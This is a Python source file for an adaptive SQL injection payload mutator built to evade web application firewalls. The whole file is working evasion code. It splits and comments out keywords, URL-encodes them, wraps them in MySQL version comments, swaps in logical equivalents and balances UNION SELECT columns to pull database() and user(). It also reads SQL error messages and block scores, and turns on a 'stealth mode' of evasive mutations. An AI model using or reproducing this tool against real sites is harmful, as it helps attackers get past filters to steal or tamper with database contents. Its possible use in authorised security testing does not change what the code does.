import random
import re

class ASTMutator:
    def __init__(self):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation
        }
        # Awareness: Track success of each strategy
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Gene Credit Assignment: Track reputation of each keyword
        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
        self.last_strategy_used = None
        self.stealth_mode = False

    def mutate(self, payload, error_msg=None, intensity=1):
        mutated = str(payload)
        
        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            
        # 2. Context-Aware Mutation: Detect and wrap payload if needed
        mutated = self._context_aware_wrap(mutated)
        
        # 3. Standard Mutations with Weighted Selection
        num_mutations = random.randint(1, 2) * intensity
        
        # Awareness: If in stealth mode, favor stealthy strategies
        current_weights = dict(self.strategy_weights)
        if self.stealth_mode:
            current_weights["context_aware"] *= 2.0
            current_weights["inline_comments"] *= 2.0
            current_weights["directed_bypass"] *= 3.0
            print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)

        for _ in range(num_mutations):
            # Pick strategy based on weights
            names = list(self.strategies.keys())
            weights = [current_weights[n] for n in names]
            strat_name = random.choices(names, weights=weights, k=1)[0]
            
            self.last_strategy_used = strat_name
            mutated = self.strategies[strat_name](mutated)
            
        return mutated

    def report_success(self, payload, score):
        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
        # Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
            # Penalize keywords present in a blocked payload
            for kw in self.sql_keywords:
                if kw in payload.upper():
                    self.keyword_reputation[kw] -= 0.1
                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
        else:
            self.stealth_mode = False
            # Reward keywords in a successful payload
            if score > 0.5:
                for kw in self.sql_keywords:
                    if kw in payload.upper():
                        self.keyword_reputation[kw] += 0.05
                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])

        if self.last_strategy_used and score > 0.5:
            # Reward the strategy
            self.strategy_weights[self.last_strategy_used] += 0.1
            # Normalize to prevent runaway weights
            total = sum(self.strategy_weights.values())
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total
                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
        mutated = payload
        # Find keywords with low reputation in the current payload
        for kw, rep in self.keyword_reputation.items():
            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
                # Apply a bypass transformation
                bypasses = [
                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
                    lambda k: f"/*!{k}*/",
                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
                ]
                transform = random.choice(bypasses)
                # Use regex to replace keyword while preserving case if possible
                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload: return payload.replace("'", "''")
            
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets)."""
        if random.random() > 0.7:
            wrappers = [
                ("'", "'"),
                ('"', '"'),
                ("') ", " --"),
                ('") ', " --"),
                (")) ", " --")
            ]
            prefix, suffix = random.choice(wrappers)
            if not payload.startswith(prefix):
                return prefix + payload + suffix
        return payload

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "attack_unit", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _context_aware_mutation(self, payload):
        mutated = str(payload)
        
        # 1. Quote Alteration: Swap quotes
        if "'" in mutated:
            if random.random() < 0.4:
                mutated = mutated.replace("'", '"')

        # 2. Comment Wrapping: Wrap keywords or parts of the payload
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.3:
                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)

        # 3. Space/Separator Mutation
        if " " in mutated:
            separators = ["/**/", "/*!*/", "+"]
            sep = random.choice(separators)
            mutated = mutated.replace(" ", sep)

        return mutated
